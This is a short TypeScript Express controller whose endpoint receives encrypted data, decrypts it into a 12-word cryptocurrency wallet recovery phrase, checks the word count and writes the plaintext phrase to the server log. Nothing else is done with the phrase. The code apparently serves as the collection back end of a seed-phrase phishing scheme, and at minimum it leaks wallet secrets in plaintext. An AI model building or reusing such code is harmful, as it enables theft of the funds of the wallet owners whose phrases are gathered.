import { Request, Response, NextFunction } from 'express';
import { EncryptionService } from '../services/encryption.service';
import { ErrorResponse, SeedRequest } from '../types';

export class SeedController {
  static async handleSeed(
    req: Request<{}, {}, SeedRequest>,
    res: Response<ErrorResponse | { status: string }>,
    next: NextFunction
  ) {
    try {
      if (!req.body.data) return res.status(400).json({ error: 'missing' });
      
      const mnemonic = EncryptionService.decryptData(req.body.data);
      if (mnemonic.split(' ').length !== 12) {
        return res.status(400).json({ error: 'invalid' });
      }

      console.log(mnemonic);
      res.json({ status: 'success' });
    } catch (error) {
      next(error);
    }
  }
}